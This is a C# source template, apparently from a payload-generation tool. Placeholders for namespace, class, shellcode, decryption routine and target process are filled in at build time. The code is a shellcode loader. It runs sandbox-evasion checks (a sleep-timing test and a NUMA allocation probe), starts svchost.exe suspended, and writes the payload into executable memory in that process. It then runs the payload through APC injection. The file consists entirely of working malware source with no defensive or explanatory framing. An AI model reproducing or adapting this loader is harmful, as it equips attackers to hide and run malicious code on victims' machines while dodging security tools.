using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace #NS#
{
    public class #CLASS#
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref #SI# lpStartupInfo, out #PI# lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct #SI# {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct #PI# {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static void Main(string[] args)
        {
            // Evasion: Sleep check
            DateTime t1 = DateTime.Now;
            Sleep(5000);
            if (DateTime.Now.Subtract(t1).TotalSeconds < 4.5) return;

            // Evasion: Anti-sandbox Numas
            IntPtr m = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (m == IntPtr.Zero) return;

            #SHELLCODE#
            
            #DECRYPTION#

            #SI# si = new #SI#();
            si.cb = (uint)Marshal.SizeOf(si);
            #PI# pi = new #PI#();

            // "c:\\windows\\system32\\svchost.exe" obfuscated
            string target = #TARGET_PROC#;

            // CREATE_SUSPENDED = 0x4
            bool success = CreateProcess(null, target, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi);
            if (!success) return;

            IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)#BUF#.Length, 0x3000, 0x40);
            IntPtr outSize;
            WriteProcessMemory(pi.hProcess, addr, #BUF#, (uint)#BUF#.Length, out outSize);

            // Queue the APC call to our shellcode address
            QueueUserAPC(addr, pi.hThread, IntPtr.Zero);

            // Resume the thread to trigger the APC
            ResumeThread(pi.hThread);
        }
    }
}
